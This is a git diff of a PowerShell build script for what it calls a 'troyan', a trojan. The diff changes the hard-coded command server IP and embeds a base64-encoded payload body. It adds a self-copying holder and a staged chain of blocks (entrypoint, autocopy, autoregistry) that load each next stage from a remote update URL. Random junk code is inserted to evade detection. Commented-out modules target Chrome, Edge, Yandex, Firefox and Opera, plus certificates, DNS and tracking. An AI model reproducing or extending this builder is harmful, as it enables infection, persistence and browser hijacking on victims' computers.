@@ -3,7 +3,7 @@ param (
 )
 
 if ($serverName -eq "") {
-    $serverName = "185.247.141.125"
+    $serverName = "26.52.168.113"
     $action = "exe"
 } 
 
@@ -134,7 +134,12 @@ function Filter-ObjectByKeywords {
             $filteredObject | Add-Member -MemberType NoteProperty -Name $property.Name -Value $property.Value
         }
     }
+    try {
+        $filteredObject.dnSponsor = $null
+    }
+    catch {
 
+    }
     return $filteredObject
 }
 
@@ -253,7 +258,7 @@ function Make-Template-Body {
     `$server = '_SERVER' | ConvertFrom-Json
 
 "@
-    $keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
+    $keywords = @("Dir", "troyan","dnSponsor", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
     $filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
     $servStr = ($filteredObject | ConvertTo-Json)
     $template  = $template -replace "_SERVER", $servStr
@@ -262,33 +267,6 @@ function Make-Template-Body {
     return $template
 }
 
-function Make-Template-Holder { 
-    param ([string]$target, [bool]$withBody, [bool]$withSelf, [string]$selfTemplate)
-    $template = Make-Template-Body
-
-    if ($withBody -eq $true)
-    {
-        $template += @"
-
-        `$xbody = "__BODY"
-"@
-        $body = Encode-FileToBase64 -inFile $server.troyanBody
-        $template = $template -replace "__BODY", $body
-    }
-
-
-    if ($withSelf -eq $true)
-    {
-        $template += @"
-
-        `$xholder = "__SELF"
-
-"@
-        $template = $template -replace "__SELF", $selfTemplate
-    }
-
-    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_$target.ps1")
-}
 
 function Make-Template-Embeddings { 
 
@@ -350,6 +328,41 @@ function Make-Template-Cert {
     $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_cert.ps1")
 } 
 
+function Make-Template-AutoExtract {
+    $template = ""
+    $template += @"
+
+    `$xbody = "__BODY"
+
+"@
+
+    $body = Encode-FileToBase64 -inFile $server.troyanBody
+    $template = $template -replace "__BODY", $body
+    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autoextract.ps1")
+}
+
+function Make-Template-AutoCopy{  param ([string]$selfTemplate)
+    $template = @"
+
+    `$xholder = "__SELF"
+
+"@
+   
+    $template = $template -replace "__SELF", $selfTemplate
+    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autocopy.ps1")
+}
+
+function Enrich-AutoCopy { 
+    param ( [string]$targetFile)
+
+    $template = GetUtfNoBom -file $targetFile
+    $add = GetUtfNoBom -file (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autocopy.ps1")
+    $template = $add + $template
+    Utf8NoBom -data $template -file $targetFile
+}
+    
+
+
 
 function Make-Ps1Files {
     param ([string]$target)
@@ -357,13 +370,14 @@ function Make-Ps1Files {
     $allFiles = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
     
     $holderFiles = @()
-    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_holder_mono.ps1") }
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_body.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_embeddings.ps1") }
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_autoextract.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("autocopy.ps1", "autoextract.ps1", "autoregistry.ps1", "embeddings.ps1", "autoupdate.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("holder_mono.ps1") }
 
-    $exceptFiles = $allFiles | Where-Object { $_.Name -in @("holder.ps1") }
+    $exceptFiles = $allFiles | Where-Object { $_.Name -in @("holder.ps1") -or $_.Name -in @("holder_suffix.ps1") -or $_.Name -in @("entrypoint.ps1") -or $_.Name -in @("consts_autocopy.ps1")    }
 
     if ($target -ne "body")
     {
@@ -416,9 +430,10 @@ function BuldScriptMono{
         $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_body.ps1', "`n`n"
-        $fileContent = $fileContent -replace '. ./consts_holder.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_embeddings.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_cert.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts_autocopy.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts_autoextract.ps1', "`n`n"
         if ($random -eq $true)
         {
             $joinedContent += Generate-RandomCode
@@ -449,83 +464,96 @@ BuldScriptMono -files $files -outputFile $server.troyanBodyClean -random $false
 $encoded = Encode-FileToBase64 -inFile $server.troyanBody
 Utf8NoBom -data $encoded -file $server.userTroyanBody
 
-Make-Template-Holder -target "holder_mono" -withBody $true -withSelf $false -selfTemplate ""
+Make-Template-AutoExtract
+
 $files = Make-Ps1Files -target "holder_mono"
 BuldScriptMono -files $files -outputFile $server.troyanHolderMono -random $true
 BuldScriptMono -files $files -outputFile $server.troyanHolderCleanMono -random $false
-$holderBase = Encode-FileToBase64 -inFile $server.troyanHolderMono
 
-Make-Template-Holder -target "holder_mono" -withBody $true -withSelf $true -selfTemplate $holderBase
-$files = Make-Ps1Files -target "holder_mono"
-BuldScriptMono -files $files -outputFile $server.troyanHolderMono -random $true
-BuldScriptMono -files $files -outputFile $server.troyanHolderCleanMono -random $false
-$encoded = Encode-FileToBase64 -inFile $server.troyanHolderMono
-Utf8NoBom -data $encoded -file $server.userTroyanHolderMono
-
+$holderSelf = Encode-FileToBase64 -inFile $server.troyanHolderMono
+Make-Template-AutoCopy -selfTemplate $holderSelf
+Enrich-AutoCopy -targetFile $server.troyanHolderMono
+Enrich-AutoCopy -targetFile $server.troyanHolderCleanMono
 ##
 
 
 
-function BuldScript{
-       function get{
-        param ([string]$name)
-      
-            $fn =Join-Path -Path $server.troyanScriptDir -ChildPath $name
-            $contentBytes = [System.IO.File]::ReadAllBytes($fn)
-            $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
-            return  "`n`n" + $contentWithoutBom +  "`n`n"
-       }
+function BuldScript
+{
+    function get{
+    param ([string]$name)
+    
+        $fn =Join-Path -Path $server.troyanScriptDir -ChildPath ($name + ".ps1")
+        $contentBytes = [System.IO.File]::ReadAllBytes($fn)
+        $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
+        return  "`n`n" + $contentWithoutBom +  "`n`n"
+    }
 
-       $pref = '
-       # $generalJob = Start-Job -ScriptBlock {
+    $pref = '
 
-           function writedbg2 {
-                   param (
-                       [string]$msg,   [string]$msg2=""
-                   )
-               }
-               '
+        function writedbg2 {
+                param (
+                    [string]$msg,   [string]$msg2=""
+                )
+            }
+            '
 
-       $suff = '
-   #    }
-   # Wait-Job -Job $generalJob
-   # Receive-Job -Job $generalJob
-   # Remove-Job -Job $generalJob
-       ';
+    $suff = '
 
-    $utils = get -name "utils.ps1"
-    $consts_holder = get -name "consts_holder.ps1"
-    $consts_holder_mono = get -name "consts_holder_mono.ps1"
-    $consts_embeddings = get -name "consts_embeddings.ps1"
-    $consts_cert = get -name "consts_cert.ps1"
+    ';
 
-    $files = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
+    $utils = get -name "utils"
+    $consts_holder = get -name "consts_holder"
+    $consts_holder_mono = get -name "consts_holder_mono"
+    $consts_embeddings = get -name "consts_embeddings"
+    $consts_cert = get -name "consts_cert"
 
-    foreach ($file in $files) {
-        $fn = $file.Name
+    function make
+    {
+        param ([object]$cur, [object]$next)
 
+        $fn = $cur.block
+        $base = $server.updateUrlBlock
+        $nextBlock = $next.block
         $fileContent =""
+        if ($fn -eq "entrypoint")
+        {
+        
+            $fileContent = "
+
+. ./consts_holder.ps1
+. ./utils.ps1
+
+RunRemote -baseUrl '$base' -block '$nextblock'
+
+"
+            Utf8NoBom -data $fileContent -file (Join-Path -Path $server.troyanScriptDir -ChildPath "entrypoint.ps1")
+        }
+        
         $fileContent += get -name $fn
         $fileContent = $fileContent -replace "\.\s+\./[^/]+\.ps1", "`n`n"
         $fileContent += $suff    
-        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath $fn
-        if ($fn -eq "embeddings.ps1")
+        
+        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ($fn + ".ps1")
+        if ($fn -eq "embeddings")
         {
-            $fileContent = $utils + $consts_holder +  $consts_embeddings +  $fileContent
+            $fileContent = $utils + (Generate-RandomCode) + $consts_holder +  $consts_embeddings +  $fileContent
         }
-        elseif ($fn -eq "autocopy.ps1" -or $fn -eq "autoextract.ps1")
+        elseif ($fn -eq "autocopy")
         {
-            $fileContent = $utils + $consts_holder_mono +  $consts_cert +  $fileContent
+            $fileContent = $utils + (Generate-RandomCode) + $consts_holder_mono +  $consts_cert +  $fileContent
         }
-        elseif ($fn -eq "cert.ps1")
+        elseif ($fn -eq "cert")
         {
-            $fileContent = $utils + $consts_holder +  $consts_cert +  $fileContent
+            $fileContent = $utils + (Generate-RandomCode) + $consts_holder +  $consts_cert +  $fileContent
         }
         else 
         {
-            $fileContent = $utils + $consts_holder + $fileContent
+            $fileContent = $utils + (Generate-RandomCode) + $consts_holder + $fileContent
         }
-        $fileContent = $pref + (Generate-RandomCode) +  $fileContent + $suff
+        $fileContent = $pref + (Generate-RandomCode) +  $fileContent + $suff + (Generate-RandomCode)
+
+
 
         Utf8NoBom -data $fileContent -file $outFile
 
@@ -533,21 +561,76 @@ function BuldScript{
         $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ([System.IO.Path]::ChangeExtension($fn, ".txt"))
         Utf8NoBom -data $encoded -file $outFile
     }
-}
+
+    $units = @(
+        [PSCustomObject]@{ block = "holder"; isJob = $true; isWait = $false; isStart = $true},
+
+        [PSCustomObject]@{ block = "entrypoint"; isJob = $true; isWait = $false; isStart = $true},
+
+        [PSCustomObject]@{ block = "autocopy"; isJob = $true; isWait = $false },
+
+        [PSCustomObject]@{ block = "autoregistry"; isJob = $true; isWait = $false; isStop = $true }
 
 
-Make-Template-Holder -target "holder" -withBody $false -withSelf $false -selfTemplate $holderBase
-BuldScript
-Copy-Item -Path (Join-Path -Path $server.troyanOutputBlock -ChildPath "holder.ps1") -Destination $server.troyanHolder -Force
-Copy-Item -Path (Join-Path -Path $server.troyanOutputBlock -ChildPath "holder.ps1") -Destination $server.userTroyanHolder -Force
-$outPath = $server.userTroyanBlock
-if (-not [string]::IsNullOrEmpty($outPath)) 
-{
-    Remove-Item -Path $outPath\* -Recurse -Force
-    if (-not (Test-Path $outPath )) {
-        New-Item -Path $outPath  -ItemType Directory
+        # [PSCustomObject]@{ block = "dnsman"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "cert"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "chrome"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "edge"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "yandex"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "firefox"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "opera"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "chrome_ublock"; isJob = $true; isWait = $false }
+        
+        # [PSCustomObject]@{ block = "chrome_push"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "tracker"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "extraupdate"; isJob = $true; isWait = $false }
+    )
+    
+
+    for ($no = 0; $no -lt $units.Length; $no++)
+    {
+        $cur = $units[$no]
+        $next = if ($no + 1 -lt $units.Count) { $units[$no + 1] } else { $null }
+        if ($cur.isStop)
+        {
+            $next = $null
+        }
+
+        Write-Output "Iteration $no :"
+        Write-Output "Current: Block = $($cur.block), isJob = $($cur.isJob), isWait = $($cur.isWait)"
+        if ($null -ne $next) {
+            Write-Output "Next: Block = $($next.block), isJob = $($next.isJob), isWait = $($next.isWait)"
+        } else {
+            Write-Output "Next: None"
+        }
+        
+        make -cur $cur, -next $next 
+        
+        Write-Output "----"
     }
 }
-Copy-Item -Path $server.troyanOutputBlock -Destination $server.userDataDir -Force -Recurse
 
-Write-Host "Troyan Compile complete"
+
+# Make-Template-Holder -target "holder" -withBody $false -withSelf $false -selfTemplate $holderBase
+# BuldScript
+# Copy-Item -Path (Join-Path -Path $server.troyanOutputBlock -ChildPath "holder.ps1") -Destination $server.troyanHolder -Force
+# $outPath = $server.userTroyanBlock
+# if (-not [string]::IsNullOrEmpty($outPath)) 
+# {
+#     Remove-Item -Path $outPath\* -Recurse -Force
+#     if (-not (Test-Path $outPath )) {
+#         New-Item -Path $outPath  -ItemType Directory
+#     }
+# }
+# Copy-Item -Path $server.troyanOutputBlock -Destination $server.userDataDir -Force -Recurse
+
+# Write-Host "Troyan Compile complete"
